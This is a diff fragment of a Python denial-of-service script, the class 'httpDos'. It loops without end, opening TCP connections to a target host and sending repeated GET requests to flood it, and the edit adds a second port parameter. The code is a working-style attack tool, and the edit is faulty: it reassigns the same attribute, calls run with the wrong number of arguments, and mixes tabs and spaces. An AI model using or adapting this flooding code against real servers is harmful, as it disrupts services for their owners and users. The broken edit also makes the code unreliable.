@@ -7,18 +7,19 @@ running = True
 count = 0
 
 class httpDos():
-    def __init__(self, host, port=80):
+    def __init__(self, host, port=80, port1=443):
         self.host = host
         self.port = port
-	self.port = port
+	self.port = port1
         self.run(host, port)
-    def run(self, host, port):
+    def run(self, host, port, port1):
         while running:
             ip = socket.gethostbyname(host)
             dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             msg = 'Null'
             try:
                 dos.connect((host, 80))
+		
                 dos.send("GET / HTTP/1.1\r\n")
                 dos.sendto("GET /%s HTTP/1.1\r\n" % msg, (ip, port))
                 global count; count+=1
